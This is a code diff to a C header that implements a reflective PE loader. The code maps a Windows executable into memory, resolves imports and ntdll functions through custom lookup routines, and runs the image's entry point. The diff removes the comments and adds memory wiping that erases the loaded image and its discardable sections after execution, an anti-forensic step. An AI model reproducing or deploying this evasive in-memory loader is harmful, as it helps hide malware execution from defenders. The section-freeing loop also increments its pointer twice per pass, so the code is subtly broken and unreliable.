@@ -56,13 +56,11 @@ static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
         if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
             char* s = (char*)((BYTE*)curMod + foundRVA);
 
-            // parse DLL name
             size_t dllLen = 0; while (s[dllLen] && s[dllLen] != '.') dllLen++;
             char* dll = (char*)alloca(dllLen + 1);
             for (size_t i = 0; i < dllLen; i++) dll[i] = s[i]; dll[dllLen] = 0;
             s += dllLen + 1;
 
-            // parse function name
             size_t fnameLen = 0; while (s[fnameLen]) fnameLen++;
             char* fname = (char*)alloca(fnameLen + 1);
             for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i]; fname[fnameLen] = 0;
@@ -112,17 +110,14 @@ static void ExecuteFromMemory(unsigned char* data) {
 
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
 
-    // allocate memory
     PVOID base = NULL;
     SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
     NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
     NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // copy headers
     for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
         ((BYTE*)base)[i] = data[i];
 
-    // copy sections
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
         BYTE* src  = data + sec[i].PointerToRawData;
@@ -130,7 +125,6 @@ static void ExecuteFromMemory(unsigned char* data) {
         while (sz--) *dest++ = *src++;
     }
 
-    // apply relocations
     ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
     if (delta) {
         IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -150,7 +144,6 @@ static void ExecuteFromMemory(unsigned char* data) {
 
     ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
 
-    // protect sections
     BYTE* regionStart = (BYTE*)base;
     SIZE_T regionSize = sec[0].VirtualAddress + sec[0].Misc.VirtualSize;
     ULONG currentProt = SectionProtection(sec[0].Characteristics);
@@ -174,24 +167,21 @@ static void ExecuteFromMemory(unsigned char* data) {
     if (regionSize)
         NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&regionStart, &regionSize, currentProt, &oldProt);
 
-    // free discardable sections
     sec = IMAGE_FIRST_SECTION(nt);
     NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
         if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
             PVOID discardBase = (BYTE*)base + sec[i].VirtualAddress;
             SIZE_T discardSize = sec[i].Misc.VirtualSize;
+            SecureZeroMemory(discardBase, discardSize);
             NtFreeVirtualMemory((HANDLE)-1, &discardBase, &discardSize, MEM_DECOMMIT);
         }
     }
 
-    // execute entry
     ((void(*)(void))(base + nt->OptionalHeader.AddressOfEntryPoint))();
 
-    // free image
-    totalSize = nt->OptionalHeader.SizeOfImage;
+    SecureZeroMemory(base, totalSize);
     NtFreeVirtualMemory((HANDLE)-1, &base, &totalSize, MEM_RELEASE);
 }
 
 #endif // PE_LOADER_H
-
